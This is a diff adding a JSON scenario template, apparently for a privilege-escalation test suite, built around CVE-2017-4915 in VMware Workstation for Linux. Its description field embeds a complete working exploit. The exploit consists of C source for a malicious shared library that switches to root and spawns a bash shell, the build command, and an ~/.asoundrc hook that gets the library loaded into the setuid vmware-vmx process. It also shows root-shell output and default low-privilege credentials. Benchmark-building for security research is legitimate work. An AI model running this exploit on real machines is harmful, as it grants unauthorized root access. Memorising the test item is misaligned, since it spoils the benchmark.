@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_42045",
+  "category": "B1_ld_preload",
+  "attack_technique": "T1574.006",
+  "cwe": "CWE-427",
+  "description": "Linux privilege escalation: VMware Workstation for Linux 12.5.2 build-4638234 - ALSA Configuration Host Local Privilege Escalation (CVE-2017-4915)\n\nExploit source code (42045.c):\n```\n/*\nSource: https://bugs.chromium.org/p/project-zero/issues/detail?id=1142\n\nThis vulnerability permits an unprivileged user on a Linux machine on\nwhich VMWare Workstation is installed to gain root privileges.\n\nThe issue is that, for VMs with audio, the privileged VM host\nprocess loads libasound, which parses ALSA configuration files,\nincluding one at ~/.asoundrc. libasound is not designed to run in a\nsetuid context and deliberately permits loading arbitrary shared\nlibraries via dlopen().\n\nTo reproduce, run the following commands on a normal Ubuntu desktop\nmachine with VMWare Workstation installed:\n\n\n~$ cd /tmp\n/tmp$ cat > evil_vmware_lib.c\n*/\n\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <err.h>\n\nextern char *program_invocation_short_name;\n\n__attribute__((constructor)) void run(void) {\n\tif (strcmp(program_invocation_short_name, \"vmware-vmx\"))\n\t\treturn;\n\n\tuid_t ruid, euid, suid;\n\tif (getresuid(&ruid, &euid, &suid))\n\t\terr(1, \"getresuid\");\n\tprintf(\"current UIDs: %d %d %d\\n\", ruid, euid, suid);\n\tif (ruid == 0 || euid == 0 || suid == 0) {\n\t\tif (setresuid(0, 0, 0) || setresgid(0, 0, 0))\n\t\t\terr(1, \"setresxid\");\n\t\tprintf(\"switched to root UID and GID\");\n\t\tsystem(\"/bin/bash\");\n\t\t_exit(0);\n\t}\n}\n\n/*\n/tmp$ gcc -shared -o evil_vmware_lib.so evil_vmware_lib.c -fPIC -Wall -ldl -std=gnu99\n/tmp$ cat > ~/.asoundrc\nhook_func.pulse_load_if_running {\n        lib \"/tmp/evil_vmware_lib.so\"\n        func \"conf_pulse_hook_load_if_running\"\n}\n/tmp$ vmware\n\n\nNext, in the VMWare Workstation UI, open a VM with a virtual sound\ncard and start it. Now, in the terminal, a root shell will appear:\n\n\n/tmp$ vmware\ncurrent UIDs: 1000 1000 0\nbash: cannot set terminal process group (13205): Inappropriate ioctl for device\nbash: no job control in this shell\n~/vmware/Debian 8.x 64-bit# id\nuid=0(root) gid=0(root) groups=0(root),[...]\n~/vmware/Debian 8.x 64-bit#\n\n\nI believe that the ideal way to fix this would be to run all code that\ndoesn't require elevated privileges - like the code for sound card\nemulation - in an unprivileged process. However, for now, moving only\nthe audio output handling into an unprivileged process might also do\nthe job; I haven't yet checked whether there are more libraries VMWare\nWorkstation loads that permit loading arbitrary libraries into the\nvmware-vmx process.\n\nTested with version: 12.5.2 build-4638234, running on Ubuntu 14.04.\n*/\n```",
+  "cve": "CVE-2017-4915",
+  "exploitdb_id": "42045",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_42045",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
